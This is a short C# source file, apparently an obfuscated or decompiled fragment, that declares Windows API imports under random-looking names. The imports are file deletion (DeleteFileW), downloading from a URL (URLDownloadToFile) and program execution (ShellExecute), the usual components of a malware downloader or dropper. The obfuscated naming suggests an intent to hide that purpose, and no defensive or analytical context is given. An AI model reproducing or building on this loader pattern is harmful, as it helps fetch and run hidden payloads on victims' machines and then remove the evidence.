using System.Runtime.InteropServices;

internal static class J
{
	[DllImport("kernel32.dll", EntryPoint = "DeleteFileW", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool bVRaQDElrHRWbRs8Si8fdGnMeEt9sH([MarshalAs(UnmanagedType.LPWStr)] string A);

	[DllImport("urlmon.dll", CharSet = CharSet.Auto, EntryPoint = "URLDownloadToFile", SetLastError = true)]
	public static extern int Q0tUom94drTkG62fawZSxXm4M48FwM(int A, string B, string C, int D, int E);

	[DllImport("shell32.dll", EntryPoint = "ShellExecute")]
	public static extern int K4tjqr2Q3FznFgWtAQjz3xJ9JtdZIT(int A, string B, string C, string D, string E, int F);
}
